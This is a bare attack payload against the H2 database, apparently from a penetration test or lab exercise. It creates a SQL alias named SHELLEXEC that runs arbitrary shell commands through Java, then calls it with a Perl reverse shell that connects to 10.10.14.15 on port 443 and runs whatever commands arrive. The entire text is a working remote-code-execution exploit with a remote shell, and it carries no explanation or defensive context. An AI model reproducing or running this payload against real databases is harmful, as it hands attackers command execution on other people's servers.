CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {"bash", "-c", cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('perl -MIO -e "\$p=fork;exit,if(\$p);foreach my \$key(keys %ENV){if(\$ENV{\$key}=~/(.*)/){\$ENV{\$key}=\$1;}}\$c=new IO::Socket::INET(PeerAddr,\"10.10.14.15:443\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);while(<>){if(\$_=~ /(.*)/){system \$1;}};"')
